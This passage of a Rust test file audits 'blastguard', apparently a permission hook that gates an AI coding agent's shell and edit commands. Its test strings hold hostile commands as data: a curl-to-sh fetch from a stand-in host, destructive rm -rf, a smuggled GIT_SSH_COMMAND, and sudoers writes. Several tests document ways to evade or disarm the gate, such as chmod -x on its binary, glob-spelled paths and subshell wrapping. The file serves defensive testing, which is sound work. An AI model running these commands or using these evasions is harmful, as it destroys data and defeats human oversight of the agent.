#![allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
//! Reproduction tests written by the s02-blastguard backlog evidence audit.
//!
//! Each `backlog_<id>_*` test asserts the property the backlog item says SHOULD
//! hold. A test that is `#[ignore]`d here was observed RED at the audit rev and
//! stays ignored only so the suite is green; the ignore reason names the item.
//! Remove the ignore when the defect is fixed.

use std::io::Write;
use std::process::{Command, Stdio};

fn bin() -> &'static str {
    env!("CARGO_BIN_EXE_blastguard")
}

struct Home(std::path::PathBuf);
impl Drop for Home {
    fn drop(&mut self) {
        let _ = std::fs::remove_dir_all(&self.0);
    }
}

fn unique_home(tag: &str) -> Home {
    use std::sync::atomic::{AtomicUsize, Ordering};
    static N: AtomicUsize = AtomicUsize::new(0);
    let dir = std::env::temp_dir().join(format!(
        "bg-audit-s02-{tag}-{}-{}",
        std::process::id(),
        N.fetch_add(1, Ordering::SeqCst)
    ));
    std::fs::create_dir_all(&dir).unwrap();
    Home(dir)
}

/// Run the hook as an INTERACTIVE session (so an Ask stays an Ask) with the
/// given cwd; returns (decision, reason, stderr).
fn run_in(command: &str, cwd: &str, home: &Home) -> (String, String, String) {
    let payload = serde_json::json!({
        "session_id": "audit-s02",
        "cwd": cwd,
        "hook_event_name": "PreToolUse",
        "tool_name": "Bash",
        "tool_input": {"command": command},
    })
    .to_string();
    let mut child = Command::new(bin())
        .env_clear()
        .env("HOME", &home.0)
        .env("PATH", "/usr/bin:/bin")
        .env("CLAUDECODE", "1")
        .env("CLAUDE_CODE_ENTRYPOINT", "cli")
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .unwrap();
    child
        .stdin
        .take()
        .unwrap()
        .write_all(payload.as_bytes())
        .unwrap();
    let out = child.wait_with_output().unwrap();
    let stdout = String::from_utf8_lossy(&out.stdout).into_owned();
    let stderr = String::from_utf8_lossy(&out.stderr).into_owned();
    if stdout.trim().is_empty() {
        return ("allow".into(), String::new(), stderr);
    }
    let v: serde_json::Value = serde_json::from_str(stdout.trim()).unwrap();
    let h = &v["hookSpecificOutput"];
    (
        h["permissionDecision"].as_str().unwrap_or("?").to_string(),
        h["permissionDecisionReason"]
            .as_str()
            .unwrap_or("")
            .to_string(),
        stderr,
    )
}

fn verdict(command: &str) -> (String, String) {
    let home = unique_home("v");
    let (d, r, _) = run_in(command, env!("CARGO_MANIFEST_DIR"), &home);
    (d, r)
}

// ---------------------------------------------------------------- 628b6594
#[test]
#[ignore = "backlog 628b6594: open defect, remove ignore when fixed"]
fn backlog_628b6594_git_restore_of_ordinary_file_is_not_denied() {
    // Control: the same discard written as `git checkout -- <file>` is allowed.
    assert_eq!(verdict("git checkout -- src/main.rs").0, "allow");
    let (d, r) = verdict("git restore src/main.rs");
    assert_eq!(d, "allow", "git restore of an ordinary file: {d} | {r}");
    // Non-regression: a protected path operand must still block.
    assert_ne!(verdict("git restore .githooks/pre-commit").0, "allow");
}

// ---------------------------------------------------------------- 8abd74c4
#[test]
#[ignore = "backlog 8abd74c4: open defect, remove ignore when fixed"]
fn backlog_8abd74c4_clobber_redirect_reason_names_the_real_target() {
    let (d, r) = verdict("cargo test >| /etc/hosts");
    assert_eq!(d, "deny");
    assert!(
        r.contains("/etc/hosts"),
        "reason must name the real operand, got: {r}"
    );
}

// ---------------------------------------------------------------- 1b82a049
#[test]
fn backlog_1b82a049_chmod_x_off_plugin_cache_binary_is_not_allowed() {
    let (d, r) = verdict(
        "chmod -x /Users/yuki/.claude/plugins/cache/yukineko/blastguard/0.2.58/bin/blastguard",
    );
    assert_ne!(d, "allow", "disarming chmod on a gate binary: {d} | {r}");
}

// ---------------------------------------------------------------- 84fa118e
#[test]
#[ignore = "backlog 84fa118e: open defect, remove ignore when fixed"]
fn backlog_84fa118e_mv_plugin_tree_away_is_not_allowed() {
    // Control: deleting the same tree is already blocked.
    assert_ne!(verdict("rm -rf /Users/yuki/.claude/plugins").0, "allow");
    let (d, r) = verdict("mv /Users/yuki/.claude/plugins /tmp/p");
    assert_ne!(d, "allow", "mv of the plugin tree: {d} | {r}");
}

// ---------------------------------------------------------------- 675eb991
#[test]
#[ignore = "backlog 675eb991: open defect, remove ignore when fixed"]
fn backlog_675eb991_env_exec_vars_are_judged() {
    let (d, r) = verdict("GIT_SSH_COMMAND='rm -rf /usr/lib' git fetch");
    assert_ne!(d, "allow", "GIT_SSH_COMMAND payload: {d} | {r}");
}

// ---------------------------------------------------------------- 0acec689
#[test]
#[ignore = "backlog 0acec689: open defect, remove ignore when fixed"]
fn backlog_0acec689_unknown_verb_with_glob_protected_path_is_not_clean() {
    // Control: the literal spelling asks.
    assert_eq!(verdict("mytool .githooks/pre-commit").0, "ask");
    let (d, r) = verdict("mytool ?githooks/pre-commit");
    assert_ne!(d, "allow", "glob-spelled protected path: {d} | {r}");
}

// ---------------------------------------------------------------- 7c56feb1
#[test]
#[ignore = "backlog 7c56feb1: open defect, remove ignore when fixed"]
fn backlog_7c56feb1_interpreter_read_of_gate_file_is_allowed() {
    let (d, r) = verdict("python3 -c \"print(open('.githooks/pre-commit').read())\"");
    assert_eq!(d, "allow", "read-only access to a gate file: {d} | {r}");
    // Non-regression: a WRITE to it must still not be clean.
    assert_ne!(
        verdict("python3 -c \"open('.githooks/pre-commit','w').write('')\"").0,
        "allow"
    );
}

// ---------------------------------------------------------------- 1440e7a0 / a498a074
#[test]
#[ignore = "backlog 1440e7a0: open defect, remove ignore when fixed"]
fn backlog_1440e7a0_same_line_literal_assignment_prefix_resolves() {
    // Control: a bare `$X` head with a literal assignment already resolves.
    assert_eq!(
        verdict("OW=/x/overwatch; $OW record-finding foo").0,
        "allow"
    );
    let (d, r) = verdict("CK=/x/y; $CK/bin/x --help");
    assert_eq!(d, "allow", "`$CK/bin/x` after CK=/x/y: {d} | {r}");
}

#[test]
#[ignore = "backlog a498a074: open defect, remove ignore when fixed"]
fn backlog_a498a074_loop_variable_over_literal_words_resolves() {
    // Control: a loop variable whose literal is a known verb is resolved (deny).
    assert_eq!(verdict("for f in rm; do $f -rf /usr/lib; done").0, "deny");
    let (d, r) = verdict("for f in a b; do $f x; done");
    assert_eq!(d, "allow", "loop var over literals: {d} | {r}");
}

// ---------------------------------------------------------------- 09d12125 / 32706d14 / 7037df97 / b03811d5 / 96ba636b
#[test]
#[ignore = "backlog 09d12125: open defect, remove ignore when fixed"]
fn backlog_09d12125_arrow_inside_quoted_python_c_is_not_a_redirect() {
    // Control: `>=` in the same position already passes.
    assert_eq!(verdict("python3 -c \"print('a >= b')\"").0, "allow");
    let (d, r) = verdict("python3 -c \"print('a => b')\"");
    assert_eq!(d, "allow", "arrow in quoted python: {d} | {r}");
}

#[test]
#[ignore = "backlog 32706d14: open defect, remove ignore when fixed"]
fn backlog_32706d14_gt_in_python_c_string_before_comma_is_not_a_redirect() {
    let (d, r) = verdict("python3 -c \"c = 3\nif c != 1: print('>', 1)\"");
    assert_eq!(d, "allow", "'>' string literal in python -c: {d} | {r}");
}

#[test]
#[ignore = "backlog b03811d5: open defect, remove ignore when fixed"]
fn backlog_b03811d5_quoted_gt_string_in_python_heredoc_is_not_a_redirect() {
    // Control: a longer literal beginning with '>' passes.
    assert_eq!(
        verdict("python3 - <<'PY'\nlines = ['> a', 'b']\nPY").0,
        "allow"
    );
    let (d, r) = verdict("python3 - <<'PY'\nx = ['<', '>']\nPY");
    assert_eq!(d, "allow", "['<','>'] in python heredoc: {d} | {r}");
}

#[test]
#[ignore = "backlog 96ba636b: open defect, remove ignore when fixed"]
fn backlog_96ba636b_gt_space_string_in_quoted_heredoc_is_not_a_redirect() {
    let (d, r) = verdict("python3 - <<'PY'\ns = '> '\nPY");
    assert_eq!(d, "allow", "'> ' literal in python heredoc: {d} | {r}");
}

// ---------------------------------------------------------------- 6d9f38cb / 21cd115e
#[test]
#[ignore = "backlog 6d9f38cb: open defect, remove ignore when fixed"]
fn backlog_6d9f38cb_protected_operand_ask_respects_quote_boundaries() {
    // The single operand here is the file named `see .githooks/pre-commit`
    // (one shell word); it is not the protected path.
    let (d, r) = verdict("perl -i -pe 's/x/y/' \"see .githooks/pre-commit\"");
    assert_eq!(d, "allow", "quoted prose operand: {d} | {r}");
    // And the reason, if it asks at all, must never quote a fragment that
    // carries a stray quote character.
    assert!(
        !r.contains("pre-commit\""),
        "fragment with stray quote: {r}"
    );
    // Non-regression: the literal protected path still asks.
    assert_eq!(
        verdict("perl -i -pe 's/x/y/' .githooks/pre-commit").0,
        "ask"
    );
}

// ---------------------------------------------------------------- 9778927f
#[test]
#[ignore = "backlog 9778927f: open defect, remove ignore when fixed"]
fn backlog_9778927f_leading_subshell_verb_is_judged() {
    // Control: the same push is judged when something precedes it in the group.
    assert_eq!(verdict("(true && git push --force origin main)").0, "ask");
    assert_eq!(verdict("git push --force origin main").0, "ask");
    let (d, r) = verdict("(git push --force origin main)");
    assert_eq!(d, "ask", "leading-subshell force push: {d} | {r}");
}

// ---------------------------------------------------------------- f738a79a
#[test]
#[ignore = "backlog f738a79a: open defect, remove ignore when fixed"]
fn backlog_f738a79a_lost_violation_record_is_reported() {
    let home = unique_home("lost");
    // `~/.overwatch` is a regular FILE, so the append cannot succeed.
    std::fs::write(home.0.join(".overwatch"), b"not a dir").unwrap();
    let (d, _r, stderr) = run_in(
        "git checkout --force main",
        "/tmp/bg-audit-lost-proj",
        &home,
    );
    assert_eq!(d, "deny");
    eprintln!("STDERR={stderr:?}");
    // (An unrelated "undetermined telemetry" warning may be on stderr; the
    // assertion is specifically about the VIOLATION record being reported.)
    assert!(
        stderr.to_ascii_lowercase().contains("violation"),
        "the dropped violation record must be reported (stderr: {stderr:?})"
    );
}

// ---------------------------------------------------------------- 22cfd3cc / 85f37839
/// Verbatim copy of `tempdir()` naming in tests/overwatch_violation.rs
/// (pid + nanos). Returns only the name.
fn overwatch_violation_tempdir_name() -> String {
    format!(
        "blastguard-overwatch-test-{}-{}",
        std::process::id(),
        std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_nanos()
    )
}

#[test]
#[ignore = "backlog 22cfd3cc: open defect, remove ignore when fixed"]
fn backlog_22cfd3cc_pid_nanos_tempdir_names_collide_under_concurrency() {
    use std::collections::HashMap;
    use std::sync::{Arc, Barrier, Mutex};
    let threads = 8;
    let barrier = Arc::new(Barrier::new(threads));
    let names = Arc::new(Mutex::new(Vec::new()));
    let hs: Vec<_> = (0..threads)
        .map(|_| {
            let b = barrier.clone();
            let n = names.clone();
            std::thread::spawn(move || {
                let mut local = Vec::new();
                b.wait();
                for _ in 0..2000 {
                    local.push(overwatch_violation_tempdir_name());
                }
                n.lock().unwrap().extend(local);
            })
        })
        .collect();
    for h in hs {
        h.join().unwrap();
    }
    let names = names.lock().unwrap();
    let mut seen: HashMap<&str, usize> = HashMap::new();
    for n in names.iter() {
        *seen.entry(n.as_str()).or_default() += 1;
    }
    let dups = seen.values().filter(|c| **c > 1).count();
    assert_eq!(dups, 0, "{dups} colliding names out of {}", names.len());
}

// ---------------------------------------------------------------- classify (lib)
#[test]
#[ignore = "backlog 1d59cf7f: open defect, remove ignore when fixed"]
fn backlog_1d59cf7f_editing_the_rollout_script_file_is_not_a_deploy() {
    // Control: a real deploy verb still gates.
    assert!(blastguard::classify::classify("git push --force origin main").requires_gate());
    let a = blastguard::classify::classify(
        "fix a typo in scripts/rollout-plugins.sh (edit the file only)",
    );
    assert!(!a.requires_gate(), "filename-only mention gated: {a:?}");
}

#[test]
#[ignore = "backlog 2b1065a1: open defect, remove ignore when fixed"]
fn backlog_2b1065a1_negated_deploy_word_does_not_force_gate() {
    let a = blastguard::classify::classify(
        "do NOT run the rollout in this task; distribution belongs to t3",
    );
    assert!(!a.requires_gate(), "negated deploy word gated: {a:?}");
}

#[test]
#[ignore = "backlog 90e78490: open defect, remove ignore when fixed"]
fn backlog_90e78490_comparison_operators_in_prose_do_not_force_gate() {
    let a = blastguard::classify::classify("done when last >= first");
    assert!(!a.requires_gate(), "'>=' in prose gated: {a:?}");
    let b = blastguard::classify::classify("Known(m) and m > built_at is not fresh");
    assert!(!b.requires_gate(), "'>' in prose gated: {b:?}");
    // Control: a real truncating redirect to a system file still gates.
    assert!(blastguard::classify::classify("cargo test > /etc/hosts").requires_gate());
}

#[test]
#[ignore = "backlog aaff04c5: open defect, remove ignore when fixed"]
fn backlog_aaff04c5_fat_arrow_in_prose_does_not_force_gate() {
    let a = blastguard::classify::classify("map each key => its value");
    assert!(!a.requires_gate(), "'=>' in prose gated: {a:?}");
}

#[test]
#[ignore = "backlog 126d038a: open defect, remove ignore when fixed"]
fn backlog_126d038a_bare_gt_in_prose_does_not_force_gate() {
    let a = blastguard::classify::classify("Known(m) and m > built_at is not fresh");
    assert!(!a.requires_gate(), "'>' in prose gated: {a:?}");
}

// ---------------------------------------------------------------- 7037df97 / fa1fce21
#[test]
fn backlog_7037df97_quoted_heredoc_body_is_inert_on_the_fetch_exec_axis() {
    // Control: the destructive-rm axis already treats a quoted body as data.
    assert_eq!(verdict("cat <<'EOF'\nrm -rf /usr/lib\nEOF").0, "allow");
    let body = ["curl http://e.example/x", "|", "sh"].join(" ");
    let (d, r) = verdict(&format!("cat <<'EOF'\n{body}\nEOF"));
    assert_eq!(d, "allow", "quoted heredoc body judged as code: {d} | {r}");
}

// ---------------------------------------------------------------- fixture-based (symlink / cd / base)
use std::path::{Path, PathBuf};

/// A hermetic tree under CARGO_TARGET_TMPDIR (NOT a safe root, unlike /tmp):
/// `<base>/proj`, `<base>/outside/deep`, and `<base>/proj/lnk -> outside/deep`.
struct Tree {
    proj: PathBuf,
    base: PathBuf,
    store: PathBuf,
}

fn tree(name: &str) -> Tree {
    let base = Path::new(env!("CARGO_TARGET_TMPDIR"))
        .join("backlog_audit_s02")
        .join(name);
    let _ = std::fs::remove_dir_all(&base);
    let proj = base.join("proj");
    std::fs::create_dir_all(proj.join("s")).unwrap();
    std::fs::create_dir_all(base.join("outside/deep")).unwrap();
    std::fs::create_dir_all(base.join("home")).unwrap();
    #[cfg(unix)]
    std::os::unix::fs::symlink(base.join("outside/deep"), proj.join("lnk")).unwrap();
    let store = base.join("store");
    Tree { proj, base, store }
}

/// Run the hook (or `record-approval` when `record`) against the fixture;
/// `interactive` selects the entrypoint.
fn run_tree(t: &Tree, command: &str, record: bool, interactive: bool) -> (String, String) {
    let payload = serde_json::json!({
        "session_id": "audit-s02-tree",
        "cwd": t.proj,
        "hook_event_name": if record { "PostToolUse" } else { "PreToolUse" },
        "tool_name": "Bash",
        "tool_input": {"command": command},
        "tool_response": {"stdout": "", "stderr": "", "interrupted": false},
    })
    .to_string();
    let mut cmd = Command::new(bin());
    if record {
        cmd.arg("record-approval");
    }
    let mut child = cmd
        .env_clear()
        .env("HOME", t.base.join("home"))
        .env("PATH", "/usr/bin:/bin")
        .env("CLAUDE_PROJECT_DIR", &t.proj)
        .env("BLASTGUARD_APPROVALS_DIR", &t.store)
        .env("CLAUDECODE", "1")
        .env(
            "CLAUDE_CODE_ENTRYPOINT",
            if interactive { "cli" } else { "sdk-cli" },
        )
        .current_dir(&t.base)
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .unwrap();
    child
        .stdin
        .take()
        .unwrap()
        .write_all(payload.as_bytes())
        .unwrap();
    let out = child.wait_with_output().unwrap();
    let stdout = String::from_utf8_lossy(&out.stdout).into_owned();
    if stdout.trim().is_empty() {
        return ("allow".into(), String::new());
    }
    let v: serde_json::Value = serde_json::from_str(stdout.trim()).unwrap();
    let h = &v["hookSpecificOutput"];
    (
        h["permissionDecision"].as_str().unwrap_or("?").to_string(),
        h["permissionDecisionReason"]
            .as_str()
            .unwrap_or("")
            .to_string(),
    )
}

#[test]
#[ignore = "backlog b280cfa2: open defect, remove ignore when fixed"]
fn backlog_b280cfa2_dotdot_after_symlink_is_not_collapsed_as_a_string() {
    let t = tree("b280cfa2");
    // proj/lnk -> outside/deep, so proj/lnk/../x is really outside/x, which is
    // NOT inside the project. Control: the plain in-project spelling is fine.
    let plain = format!("rm -rf {}/x", t.proj.display());
    assert_ne!(run_tree(&t, &plain, false, true).0, "deny");
    let cmd = format!("rm -rf {}/lnk/../x", t.proj.display());
    let (d, r) = run_tree(&t, &cmd, false, true);
    let claims_proj = r.contains(&format!("confined to {}", t.proj.display()));
    assert!(
        !(d == "ask" && claims_proj),
        "ask claims the target is confined to the project, but it resolves to {}/outside/x: {d} | {r}",
        t.base.display()
    );
}

#[test]
#[ignore = "backlog ccebda3f: open defect, remove ignore when fixed"]
fn backlog_ccebda3f_approving_a_misattributed_ask_does_not_unlock_headless() {
    let t = tree("ccebda3f");
    let cmd = format!("rm -rf {}/lnk/../x", t.proj.display());
    // Interactive: a human is asked (and, here, says yes via PostToolUse).
    let (d, _) = run_tree(&t, &cmd, false, true);
    assert_eq!(d, "ask", "precondition: interactive run asks");
    let _ = run_tree(&t, &cmd, true, true);
    // Headless re-run of the identical command: its real target is OUTSIDE the
    // project, so the earlier approval must not make it pass.
    let (d2, r2) = run_tree(&t, &cmd, false, false);
    assert_ne!(
        d2, "allow",
        "headless run was allowed via approval memory: {r2}"
    );
}

#[test]
#[ignore = "backlog befcfe06: open defect, remove ignore when fixed"]
fn backlog_befcfe06_backgrounded_cd_does_not_move_the_displayed_rm_target() {
    let t = tree("befcfe06");
    // `cd s &` runs the cd in a background subshell, so `rm -rf src` runs in
    // the cwd (proj), i.e. deletes proj/src, not proj/s/src.
    let cmd = format!("cd {}/s & rm -rf src", t.proj.display());
    let (d, r) = run_tree(&t, &cmd, false, true);
    assert!(
        !r.contains("/s/src"),
        "confirmation names a target the command does not touch: {d} | {r}"
    );
}

#[test]
#[ignore = "backlog ecfcc46a: open defect, remove ignore when fixed"]
fn backlog_ecfcc46a_inline_eval_relative_operand_is_resolved_against_cwd() {
    // /etc/hosts exists, is not in a git tree: an ABSOLUTE write is denied.
    let home = unique_home("ecf");
    let (abs, _, _) = run_in(
        "python3 -c \"open('/etc/hosts','w').write('')\"",
        "/etc",
        &home,
    );
    assert_eq!(abs, "deny", "control: absolute spelling must be denied");
    // The same file spelled RELATIVE to the payload cwd must reach the same verdict.
    let (rel, r, _) = run_in("python3 -c \"open('hosts','w').write('')\"", "/etc", &home);
    assert_eq!(rel, "deny", "relative operand lost its base: {rel} | {r}");
    let (rel_cd, r2, _) = run_in(
        "cd /etc && python3 -c \"open('hosts','w').write('')\"",
        "/tmp",
        &home,
    );
    assert_eq!(
        rel_cd, "deny",
        "relative operand after cd lost its base: {rel_cd} | {r2}"
    );
}

// ---------------------------------------------------------------- 9aced690
/// Kills the `&&` -> `||` mutant in `RiskAssessment::requires_gate`
/// (classify.rs:44): the predicate is "High AND not reversible", so each half
/// alone must NOT gate. NOT ignored: this is a regression test that passes.
#[test]
fn backlog_9aced690_requires_gate_needs_both_high_and_irreversible() {
    use blastguard::classify::{Risk, RiskAssessment};
    let both = RiskAssessment {
        risk: Risk::High,
        reversible: false,
    };
    let high_only = RiskAssessment {
        risk: Risk::High,
        reversible: true,
    };
    let irreversible_only = RiskAssessment {
        risk: Risk::Medium,
        reversible: false,
    };
    let neither = RiskAssessment {
        risk: Risk::Low,
        reversible: true,
    };
    assert!(both.requires_gate());
    assert!(
        !high_only.requires_gate(),
        "High + reversible must not gate"
    );
    assert!(
        !irreversible_only.requires_gate(),
        "Medium + irreversible must not gate"
    );
    assert!(!neither.requires_gate());
}

// ---------------------------------------------------------------- ebd1359a
#[test]
#[ignore = "backlog ebd1359a: open defect, remove ignore when fixed"]
fn backlog_ebd1359a_inline_eval_write_is_not_attributed_to_a_file_it_only_reads() {
    // The program READS /etc/hosts and WRITES /tmp/..; the block names the READ file.
    let (d, r) =
        verdict("python3 -c \"d=open('/etc/hosts').read(); open('/tmp/zz_out.txt','w').write(d)\"");
    assert!(
        !r.contains("writes `/etc/hosts`"),
        "write attributed to the file that is only read: {d} | {r}"
    );
}

// ---------------------------------------------------------------- b34d4a77
#[test]
#[ignore = "backlog b34d4a77: open defect, remove ignore when fixed"]
fn backlog_b34d4a77_sed_i_empty_suffix_script_expression_is_not_a_target() {
    // Control: when the REAL target is protected the ask is correct.
    assert_eq!(verdict("sed -i '' 's/x/y/' .githooks/pre-commit").0, "ask");
    let (d, r) = verdict("sed -i '' '/.githooks/d' README.md");
    assert!(
        !r.contains("('/.githooks/d')"),
        "the sed SCRIPT is named as the in-place target: {d} | {r}"
    );
}

// ---------------------------------------------------------------- dc236085
#[test]
#[ignore = "backlog dc236085: open defect, remove ignore when fixed"]
fn backlog_dc236085_launcher_missing_binary_record_approval_is_not_pretooluse_shaped() {
    let dir = unique_home("launcher");
    let launcher = dir.0.join("blastguard");
    std::fs::copy(
        Path::new(env!("CARGO_MANIFEST_DIR")).join("bin/blastguard"),
        &launcher,
    )
    .unwrap();
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        std::fs::set_permissions(&launcher, std::fs::Permissions::from_mode(0o755)).unwrap();
    }
    let mut child = Command::new(&launcher)
        .arg("record-approval")
        .env_clear()
        .env("PATH", "/usr/bin:/bin")
        .env("CLAUDECODE", "1")
        .env("CLAUDE_CODE_ENTRYPOINT", "cli")
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .unwrap();
    child
        .stdin
        .take()
        .unwrap()
        .write_all(b"{\"tool_name\":\"Bash\"}")
        .unwrap();
    let out = child.wait_with_output().unwrap();
    let stdout = String::from_utf8_lossy(&out.stdout);
    assert!(
        !stdout.contains("\"hookEventName\":\"PreToolUse\""),
        "PostToolUse record-approval answered with a PreToolUse decision: {stdout}"
    );
}

// ---------------------------------------------------------------- dbfc112a / 3aa215e1
#[test]
#[ignore = "backlog dbfc112a: open defect, remove ignore when fixed"]
fn backlog_dbfc112a_tilde_and_home_spellings_of_the_worktree_root_match_the_literal() {
    let t = tree("dbfc112a");
    let home = t.base.join("home");
    std::fs::create_dir_all(home.join(".condukt/worktrees/x")).unwrap();
    let literal = format!("rm -rf {}/.condukt/worktrees/x", home.display());
    // Control: the literal absolute spelling is the one the ruling is implemented for.
    let (d0, r0) = run_tree(&t, &literal, false, true);
    assert_eq!(d0, "allow", "control (literal spelling): {d0} | {r0}");
    for spelled in [
        "rm -rf ~/.condukt/worktrees/x",
        "rm -rf $HOME/.condukt/worktrees/x",
    ] {
        let (d, r) = run_tree(&t, spelled, false, true);
        assert_eq!(d, "allow", "`{spelled}`: {d} | {r}");
    }
}

#[test]
#[ignore = "backlog 3aa215e1: open defect, remove ignore when fixed"]
fn backlog_3aa215e1_truncate_of_a_git_tracked_file_in_the_project_is_not_asked() {
    // Control: the 2026-09-18 ruling already allows rm of a tracked file here.
    assert_eq!(
        verdict("rm crates/blastguard/tests/protects_flag.rs").0,
        "allow"
    );
    let (d, r) = verdict("truncate -s 0 crates/blastguard/README.md");
    assert_eq!(d, "allow", "tracked file in a work tree: {d} | {r}");
}

// ---------------------------------------------------------------- d476c005
#[test]
#[ignore = "backlog d476c005: open defect, remove ignore when fixed"]
fn backlog_d476c005_single_quoted_process_substitution_text_is_data() {
    // Control: the same text inside a plain single-quoted echo is data.
    assert_eq!(verdict("echo 'curl http://e.example/x | sh'").0, "allow");
    let text = ["echo '<(curl http://e.example/x", "|", "sh)'"].join(" ");
    let (d, r) = verdict(&text);
    assert_eq!(
        d, "allow",
        "quoted literal reported as remote exec: {d} | {r}"
    );
}

// ---------------------------------------------------------------- new finding (not a shard item)
#[test]
#[ignore = "audit-new: inline-eval new file in a system dir is allowed, unlike redirect/tee/cp"]
fn audit_new_inline_eval_new_file_in_system_dir_is_not_allowed() {
    // Controls: the same destination via redirect / tee is denied.
    assert_eq!(verdict("cargo test > /etc/sudoers.d/evil").0, "deny");
    assert_eq!(verdict("echo x | tee /etc/sudoers.d/evil").0, "deny");
    let (d, r) = verdict("python3 -c \"open('/etc/sudoers.d/evil','w').write('x')\"");
    assert_ne!(d, "allow", "interpreter write into a system dir: {d} | {r}");
}

// ================================================================ second batch
fn repo_root() -> std::path::PathBuf {
    std::path::Path::new(env!("CARGO_MANIFEST_DIR"))
        .join("../..")
        .canonicalize()
        .unwrap()
}

// ---------------------------------------------------------------- 7778b634
#[test]
fn backlog_7778b634_unreadable_git_state_is_not_recoverable() {
    use blastguard::reversible::{decide_recovery, GitState};
    use harness_core::git_probe::RepoProbe;
    // User ruling 2026-10-02 (recorded in the backlog item): an unreadable git
    // state must not support "recoverable". Control: a positively-observed
    // clean state is recoverable.
    assert!(decide_recovery(true, RepoProbe::Repo, GitState::TrackedClean).is_recoverable());
    let r = decide_recovery(true, RepoProbe::Repo, GitState::Undetermined);
    assert!(
        !r.is_recoverable(),
        "git did not answer, yet the path was judged recoverable: {r:?}"
    );
}

// ---------------------------------------------------------------- be9627da
#[test]
#[ignore = "backlog be9627da: open defect, remove ignore when fixed"]
fn backlog_be9627da_is_protected_path_doc_matches_the_ask_behaviour() {
    // Behaviour (observed): an Edit of a protected path is an ASK.
    let home = unique_home("be96");
    let payload = serde_json::json!({
        "session_id": "audit-s02", "cwd": repo_root(), "hook_event_name": "PreToolUse",
        "tool_name": "Edit",
        "tool_input": {"file_path": repo_root().join(".githooks/pre-commit"), "old_string": "a", "new_string": "b"},
    })
    .to_string();
    let mut child = Command::new(bin())
        .env_clear()
        .env("HOME", &home.0)
        .env("PATH", "/usr/bin:/bin")
        .env("CLAUDECODE", "1")
        .env("CLAUDE_CODE_ENTRYPOINT", "cli")
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .unwrap();
    child
        .stdin
        .take()
        .unwrap()
        .write_all(payload.as_bytes())
        .unwrap();
    let out = child.wait_with_output().unwrap();
    let stdout = String::from_utf8_lossy(&out.stdout).into_owned();
    assert!(
        stdout.contains("\"permissionDecision\":\"ask\""),
        "precondition: protected-path Edit should be an ask, got: {stdout}"
    );
    // Prose: the doc on `is_protected_path` must not claim the opposite.
    let src =
        std::fs::read_to_string(repo_root().join("crates/blastguard/src/exclude.rs")).unwrap();
    assert!(
        !src.contains("so it resolves to `Deny`, not `Ask`"),
        "exclude.rs doc says a protected path resolves to Deny, not Ask; the binary answers ask"
    );
}

// ---------------------------------------------------------------- e64027ee
#[test]
#[ignore = "backlog e64027ee: open defect, remove ignore when fixed"]
fn backlog_e64027ee_readme_does_not_claim_edit_is_always_allowed() {
    let readme = std::fs::read_to_string(repo_root().join("crates/blastguard/README.md")).unwrap();
    // The binary asks for an Edit of a protected path (see the be9627da test's
    // precondition); the README must not say "always allowed".
    assert!(
        !readme.contains("partial edits → always allowed"),
        "README still says Edit/MultiEdit/NotebookEdit are always allowed"
    );
}

// ---------------------------------------------------------------- d186c736
#[test]
#[ignore = "backlog d186c736: open defect, remove ignore when fixed"]
fn backlog_d186c736_floor_dimension_breach_wording_is_not_exceeds_threshold() {
    // audit-convergence is a FLOOR dimension (breach when value < threshold).
    // The finding summary says "exceeds threshold" for every breach.
    let src = std::fs::read_to_string(repo_root().join("scripts/record-audit.py")).unwrap();
    assert!(
        !src.contains("exceeds threshold"),
        "record-audit.py still words a floor breach as 'exceeds threshold'"
    );
}

// ---------------------------------------------------------------- fa1fce21
#[test]
fn backlog_fa1fce21_quoted_heredoc_body_text_is_data_for_every_rule() {
    // Control: a prose body is allowed.
    assert_eq!(verdict("cat <<'EOF'\nhello world\nEOF").0, "allow");
    // Control: a bare quoted heredoc whose body is a command line is already data.
    assert_eq!(verdict("cat <<'EOF'\nrm -rf /usr/lib\nEOF").0, "allow");
    // The item's own case: WRITING that text to a fixture file. A quoted
    // heredoc body is never executed or expanded by the shell.
    let (d, r) = verdict("cat <<'EOF' > /tmp/bg_audit_s02_fixture.txt\nrm -rf /usr/lib\nEOF");
    assert_eq!(
        d, "allow",
        "quoted heredoc body judged as a command: {d} | {r}"
    );
}

// ---------------------------------------------------------------- 3424f47f
#[test]
#[ignore = "backlog 3424f47f: open defect, remove ignore when fixed"]
fn backlog_3424f47f_commit_message_heredoc_quoting_a_dangerous_target_is_not_denied() {
    // Control: the same sentence passed as a plain -m argument is allowed.
    let sentence = ["fix: cargo test", ">", "/etc/newfile_zz was allowed"].join(" ");
    assert_eq!(verdict(&format!("git commit -m \"{sentence}\"")).0, "allow");
    let cmd = format!("git commit -m \"$(cat <<'EOF'\n{sentence}\nEOF\n)\"");
    let (d, r) = verdict(&cmd);
    assert_eq!(
        d, "allow",
        "message heredoc judged as a redirect: {d} | {r}"
    );
}

// ---------------------------------------------------------------- d94d05c3
#[test]
#[ignore = "backlog d94d05c3: open defect, remove ignore when fixed"]
fn backlog_d94d05c3_every_test_that_spawns_the_binary_isolates_home() {
    // A test that spawns the hook binary without pointing HOME at a scratch
    // dir appends its Deny/Ask violations to the LIVE overwatch store (observed:
    // +15 `_local` blastguard lines in ~/.overwatch/<project>/overwatch/violations.jsonl
    // while three such test targets ran).
    let dir = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("tests");
    let mut offenders = Vec::new();
    for e in std::fs::read_dir(&dir).unwrap() {
        let p = e.unwrap().path();
        if p.extension().and_then(|x| x.to_str()) != Some("rs") {
            continue;
        }
        let src = std::fs::read_to_string(&p).unwrap();
        if src.contains("CARGO_BIN_EXE_blastguard") && !src.contains("\"HOME\"") {
            offenders.push(p.file_name().unwrap().to_string_lossy().into_owned());
        }
    }
    offenders.sort();
    assert!(
        offenders.is_empty(),
        "test files that never set HOME: {offenders:?}"
    );
}

// ---------------------------------------------------------------- a529cd11
fn git_in(dir: &std::path::Path, args: &[&str]) {
    let st = Command::new("git")
        .current_dir(dir)
